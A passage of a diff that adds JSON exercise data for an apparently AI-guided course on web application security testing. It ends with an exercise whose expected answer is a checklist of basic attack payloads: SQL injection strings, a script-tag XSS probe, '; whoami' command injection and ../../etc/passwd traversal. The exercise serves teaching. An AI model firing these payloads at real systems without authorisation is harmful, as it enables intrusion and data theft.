+              "message": "3 findings: CSRF (no token), SQLi (concatenation), reflected XSS (confirmation page). Priority order by severity."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Build Your Assessment Toolkit",
+          "description": "Create a checklist of tests to run on any web application.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// TODO: Build a reusable assessment checklist\n// Include: test name, payload/technique, what to look for, CWE\n// Minimum 15 items covering all vulnerability types",
+          "expected_output": "ASSESSMENT CHECKLIST (15+ items):\n1. SQLi string test: ' in every field, check for SQL errors (CWE-89)\n2. SQLi bypass: ' OR '1'='1' -- in login (CWE-89)\n3. XSS reflected: <script>alert(1)</script> in every field (CWE-79)\n4. XSS stored: script in profile/comment fields (CWE-79)\n5. CSRF: check all POST forms for tokens (CWE-352)\n6. CMDi: ; whoami in system-facing inputs (CWE-78)\n7. Path traversal: ../../etc/passwd in file params (CWE-22)\n8. IDOR: change ?id= to other users' IDs (CWE-284)\n9. Forced browsing: try /admin as normal user (CWE-284)\n10. Session: check cookie flags HttpOnly/Secure (CWE-614)\n11. Session fixation: compare IDs before/after login (CWE-384)\n12. Info exposure: check error messages (CWE-200)\n13. Directory listing: browse to directories (CWE-548)\n14. Hidden fields: view source for role/admin fields\n15. HTTP methods: test PUT/DELETE on endpoints",
+          "hints": [
+            {
+              "message": "Cover all OWASP Top 10 categories with at least one test each."
+            },
+            {
+              "message": "Include injection, XSS, CSRF, access control, session, info exposure, and misconfiguration."
+            },
+            {
+              "message": "15+ items covering 7+ vulnerability categories. Each has test technique, payload, and CWE."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
